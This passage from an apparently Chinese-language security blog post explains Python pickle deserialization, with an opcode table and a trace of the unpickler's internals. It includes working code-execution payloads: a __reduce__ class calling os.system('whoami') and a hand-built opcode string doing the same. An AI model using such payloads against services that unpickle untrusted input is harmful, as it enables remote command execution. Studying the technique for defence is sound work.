+</span></span><span class="line"><span class="cl"><span class="n">NEWOBJ</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x81</span><span class="s1">&#39;</span>  <span class="c1"># build object by applying cls.__new__ to argtuple</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXT1</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x82</span><span class="s1">&#39;</span>  <span class="c1"># push object from extension registry; 1-byte index</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXT2</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x83</span><span class="s1">&#39;</span>  <span class="c1"># ditto, but 2-byte index</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXT4</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x84</span><span class="s1">&#39;</span>  <span class="c1"># ditto, but 4-byte index</span>
+</span></span><span class="line"><span class="cl"><span class="n">TUPLE1</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x85</span><span class="s1">&#39;</span>  <span class="c1"># build 1-tuple from stack top</span>
+</span></span><span class="line"><span class="cl"><span class="n">TUPLE2</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x86</span><span class="s1">&#39;</span>  <span class="c1"># build 2-tuple from two topmost stack items</span>
+</span></span><span class="line"><span class="cl"><span class="n">TUPLE3</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x87</span><span class="s1">&#39;</span>  <span class="c1"># build 3-tuple from three topmost stack items</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEWTRUE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x88</span><span class="s1">&#39;</span>  <span class="c1"># push True</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEWFALSE</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x89</span><span class="s1">&#39;</span>  <span class="c1"># push False</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG1</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8a</span><span class="s1">&#39;</span>  <span class="c1"># push long from &lt; 256 bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG4</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8b</span><span class="s1">&#39;</span>  <span class="c1"># push really big long</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">_tuplesize2code</span> <span class="o">=</span> <span class="p">[</span><span class="n">EMPTY_TUPLE</span><span class="p">,</span> <span class="n">TUPLE1</span><span class="p">,</span> <span class="n">TUPLE2</span><span class="p">,</span> <span class="n">TUPLE3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Protocol 3 (Python 3.x)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BINBYTES</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span>   <span class="c1"># push bytes; counted binary string argument</span>
+</span></span><span class="line"><span class="cl"><span class="n">SHORT_BINBYTES</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span>   <span class="c1">#  &#34;     &#34;   ;    &#34;      &#34;       &#34;      &#34; &lt; 256 bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Protocol 4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SHORT_BINUNICODE</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8c</span><span class="s1">&#39;</span>  <span class="c1"># push short string; UTF-8 length &lt; 256 bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINUNICODE8</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8d</span><span class="s1">&#39;</span>  <span class="c1"># push very long string</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINBYTES8</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8e</span><span class="s1">&#39;</span>  <span class="c1"># push very long bytes string</span>
+</span></span><span class="line"><span class="cl"><span class="n">EMPTY_SET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8f</span><span class="s1">&#39;</span>  <span class="c1"># push empty set on the stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADDITEMS</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span>  <span class="c1"># modify set by adding topmost stack items</span>
+</span></span><span class="line"><span class="cl"><span class="n">FROZENSET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x91</span><span class="s1">&#39;</span>  <span class="c1"># build frozenset from topmost stack items</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEWOBJ_EX</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x92</span><span class="s1">&#39;</span>  <span class="c1"># like NEWOBJ but work with keyword only arguments</span>
+</span></span><span class="line"><span class="cl"><span class="n">STACK_GLOBAL</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x93</span><span class="s1">&#39;</span>  <span class="c1"># same as GLOBAL but using names on the stacks</span>
+</span></span><span class="line"><span class="cl"><span class="n">MEMOIZE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x94</span><span class="s1">&#39;</span>  <span class="c1"># store top of the stack in memo</span>
+</span></span><span class="line"><span class="cl"><span class="n">FRAME</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x95</span><span class="s1">&#39;</span>  <span class="c1"># indicate the beginning of a new frame</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Protocol 5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BYTEARRAY8</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x96</span><span class="s1">&#39;</span>  <span class="c1"># push bytearray</span>
+</span></span><span class="line"><span class="cl"><span class="n">NEXT_BUFFER</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x97</span><span class="s1">&#39;</span>  <span class="c1"># push next out-of-band buffer</span>
+</span></span><span class="line"><span class="cl"><span class="n">READONLY_BUFFER</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x98</span><span class="s1">&#39;</span>  <span class="c1"># make top of stack readonly</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>protocol=num</code>来选择<code>opcode</code>的版本
+h3rmesk1t的demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Demo</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;dddddt6ttt&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">demo</span> <span class="o">=</span> <span class="n">Demo</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] pickle v</span><span class="si">{}</span><span class="s1">: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="n">i</span><span class="p">)))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>python3
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/1.png"
+        srcset="/img/pickle/1.png, /img/pickle/1.png 1.5x, /img/pickle/1.png 2x"
+        alt="/img/pickle/1.png"
+        title="/img/pickle/1.png" ></figure></li>
+</ul>
+<p>在使用的时候我们可以利用字节码来直接执行文件，例如</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cos</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">S</span><span class="s1">&#39;whoami&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">tR</span><span class="o">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然这个要遵循前面说的PVM的组成的规则</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">cos</span>         <span class="o">=&gt;</span>  <span class="err">引入模块</span> <span class="n">os</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span>      <span class="o">=&gt;</span>  <span class="err">引用</span> <span class="n">system</span><span class="p">,</span> <span class="err">并将其添加到</span> <span class="n">stack</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">S</span><span class="err">&#39;</span><span class="n">whoami</span><span class="err">&#39;</span>  <span class="o">=&gt;</span>  <span class="err">把当前</span> <span class="n">stack</span> <span class="err">存到</span> <span class="n">metastack</span><span class="p">,</span> <span class="err">清空</span> <span class="n">stack</span><span class="p">,</span> <span class="err">再将</span> <span class="err">&#39;</span><span class="n">whoami</span><span class="err">&#39;</span> <span class="err">压入</span> <span class="n">stack</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">t</span>           <span class="o">=&gt;</span>  <span class="n">stack</span> <span class="err">中的值弹出并转为</span> <span class="n">tuple</span><span class="p">,</span> <span class="err">把</span> <span class="n">metastack</span> <span class="err">还原到</span> <span class="n">stack</span><span class="p">,</span> <span class="err">再将</span> <span class="n">tuple</span> <span class="err">压入</span> <span class="n">stack</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">R</span>           <span class="o">=&gt;</span>  <span class="n">system</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="err">&#39;</span><span class="n">whoami</span><span class="err">&#39;</span><span class="p">,)).</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span>           <span class="o">=&gt;</span>  <span class="err">结束并返回当前栈顶元素</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后这里想一些opcode的一些命令在这个ppt中有
+<a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener noreferrer">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a>
+当然详细的可以去网上搜</p>
+<table>
+<thead>
+<tr>
+<th>opcode</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+<th>memo上的变化</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>c</td>
+<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）会加入self.stack</td>
+<td>c[module]\n[instance]\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]\n[callable]\n</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S&rsquo;xxx&rsquo;\n（也可以使用双引号、'等python字符串形式）</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+<td>无</td>
+</tr>
+<tr>
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>p</td>
+<td>将栈顶对象储存至memo_n（记忆栈）</td>
+<td>pn\n</td>
+<td>无</td>
+<td>对象被储存</td>
+</tr>
+<tr>
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn\n</td>
+<td>对象被压栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>0</td>
+<td>丢弃栈顶对象（self.stack）</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+<td>无</td>
+</tr>
+<tr>
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+<td>无</td>
+</tr>
+</tbody>
+</table>
+<h3 id="pikletools" class="headerLink">
+    <a href="#pikletools" class="header-mark"></a>pikletools</h3><ul>
+<li>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickletools</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x80\x03</span><span class="s2">cbuiltins</span><span class="se">\n</span><span class="s2">exec</span><span class="se">\n</span><span class="s2">q</span><span class="se">\x00</span><span class="s2">X</span><span class="se">\x13\x00\x00\x00</span><span class="s2">key1=b&#39;1&#39;</span><span class="se">\n</span><span class="s2">key2=b&#39;2&#39;q</span><span class="se">\x01\x85</span><span class="s2">q</span><span class="se">\x02</span><span class="s2">Rq</span><span class="se">\x03</span><span class="s2">.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/pickle/2.png"
+        srcset="/img/pickle/2.png, /img/pickle/2.png 1.5x, /img/pickle/2.png 2x"
+        alt="/img/pickle/2.png"
+        title="/img/pickle/2.png" ></figure>
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/3.png"
+        srcset="/img/pickle/3.png, /img/pickle/3.png 1.5x, /img/pickle/3.png 2x"
+        alt="/img/pickle/3.png"
+        title="/img/pickle/3.png" ></figure>
+可以清楚的看到做的处理及其指令，当然在上面的指令集都能找到对应的方法.</p>
+<h3 id="分析" class="headerLink">
+    <a href="#%e5%88%86%e6%9e%90" class="header-mark"></a>分析</h3><p>这里学着跟进一下反序列化过程
+这里secret文件内容就随便定义咯</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">secret</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">animal</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">animal1</span><span class="o">=</span><span class="s2">&#34;dog&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">animal</span> <span class="o">==</span><span class="n">secret</span><span class="o">.</span><span class="n">best</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">animal</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;good&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">animal</span><span class="p">(),</span><span class="n">protocol</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x03</span><span class="s1">c__main__</span><span class="se">\n</span><span class="s1">animal</span><span class="se">\n</span><span class="s1">q</span><span class="se">\x00</span><span class="s1">)</span><span class="se">\x81</span><span class="s1">q</span><span class="se">\x01</span><span class="s1">}q</span><span class="se">\x02</span><span class="s1">X</span><span class="se">\x06\x00\x00\x00</span><span class="s1">animalq</span><span class="se">\x03</span><span class="s1">X</span><span class="se">\x03\x00\x00\x00</span><span class="s1">dogq</span><span class="se">\x04</span><span class="s1">sb.&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第一步读到\x80部分
+对应的指令集
+PROTO          = b&rsquo;\x80&rsquo;  # identify pickle protocol</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_proto</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">proto</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="mi">0</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="n">proto</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="n">HIGHEST_PROTOCOL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;unsupported pickle protocol: </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">proto</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">proto</span> <span class="o">=</span> <span class="n">proto</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">PROTO</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_proto</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以读到\x03表示协议版本为3</p>
+<ul>
+<li>第二步读取c操作码
+GLOBAL         = b&rsquo;c&rsquo;   # push self.find_class(modname,
+可以看见这里对应的就是load_global和find_class</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">load_global</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">module</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="c1">#往后读到换行符作为模块名 =&amp;gt;__main__</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="c1">#往后读到换行符作为类名 =&amp;gt; animal</span>
+</span></span><span class="line"><span class="cl">        <span class="n">klass</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span> <span class="c1">#然后进入find_class寻找类</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">klass</span><span class="p">)</span> <span class="c1">#获取模块后添加到当前栈中</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dispatch</span><span class="p">[</span><span class="n">GLOBAL</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_global</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Subclasses may override this.</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">audit</span><span class="p">(</span><span class="s1">&#39;pickle.find_class&#39;</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">proto</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">3</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">fix_imports</span><span class="p">:</span>
